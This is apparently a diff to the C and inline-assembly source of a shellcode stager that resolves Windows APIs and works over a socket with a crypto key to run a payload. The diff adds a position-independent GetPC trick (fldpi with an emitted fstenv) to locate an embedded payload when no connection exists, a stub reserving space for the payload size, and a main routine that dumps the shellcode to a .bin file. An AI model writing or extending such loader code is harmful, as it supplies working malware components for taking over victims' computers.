@@ -3,6 +3,7 @@
 #include <stdio.h>
 #include "main.h"
 
+int main(int argc, char **argv);
 void scInit(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY);
 void Start(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY);
 void Payload(PSHELLCODE_CONTEXT scc);
@@ -431,15 +432,25 @@ void Payload(PSHELLCODE_CONTEXT scc){
             }
         }
     }else{
+
         DWORD last_err = ERROR_SUCCESS;
         __asm{
             xor eax, eax                    //EAX = 0
-            mov eax, DWORD PTR FS:[eax+0x18]//vEAX = &TEB
-            mov eax, [eax+0x34]             //v
+            mov eax, DWORD PTR FS:[eax+0x34]//v
             mov [last_err], eax             //> last_err = GetLastError()
         }
         if (last_err == WSAENOTCONN){
-            MessageBoxA(0,0,0,0);
+            DWORD delta = 0;
+            __asm{
+find_delta:     fldpi
+                __emit (0xD9); __emit (0x74); __emit (0x24); __emit (0xF4);    //fstenv (28-BYTE) PTR SS:[esp-0x0C]
+                pop  eax
+                sub  eax, find_delta
+                mov  [delta], eax
+            }
+            bBuff = (char*)(delta + ((PBYTE)main - (PBYTE)Start));
+            dwDSize = *(DWORD*)(delta + ((PBYTE)main - (PBYTE)Start) - 4);
+            dwSize = dwDSize;
         }else{
             return;
         }
@@ -527,12 +538,18 @@ void scInit(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYP
 
     Payload(scc);
     scc->free_(scc);
-
+    
     __asm{
         leave 
         ret 0x10
     }
     return;
+}
+
+//Valor escrito por el PM en caso de haber sido guardado offline
+//Éste establece el tamaño del PM
+void PM_SIZE(){
+    __asm __emit 0x0;__emit 0x0;__emit 0x0;__emit 0x0;
 }
 
 //Código utilizado para generar ".bin" y debuggear la shellcode
@@ -548,8 +565,6 @@ int main(int argc, char **argv){
     fopen_s(&pfBin, szBinFile, "wb");
     fwrite((PBYTE)Start, dwSize, 1, pfBin);
     fclose(pfBin);
-
-    //Start(&LoadLibraryA_, &GetProcAddress_, 0, 0);
 
     return 0;
 }
